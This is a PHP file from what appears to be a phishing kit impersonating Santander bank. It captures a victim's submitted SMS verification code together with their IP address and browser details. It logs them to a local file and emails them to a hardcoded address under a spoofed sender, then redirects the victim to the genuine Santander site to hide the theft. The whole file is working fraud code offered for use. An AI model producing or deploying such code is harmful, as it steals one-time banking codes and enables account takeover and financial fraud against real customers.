<?php

session_start();
include("../HOSTER.php"); 
include("blocker.php");
include("detect.php");

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
// include("../SHkIllUA.php"); 

$msg="|+ validEni-2(SANTANDERBANk)\r\n";
$msg.="==================================================\r\n";
$msg.="[+] Sms 2 : {$_POST['SMSERROR']}\r\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../groupe.txt","a+");fwrite($save,$msg);fclose($save);
$email="cocco.clement15@gmail.com"; //HERE
$subject="validéni-1(SANTANDERBANk) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: EIkCHI™<SANTANDERBANk@moneySquad.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);


header("Location: https://www.bancosantander.es/es/aviso-legal");

?>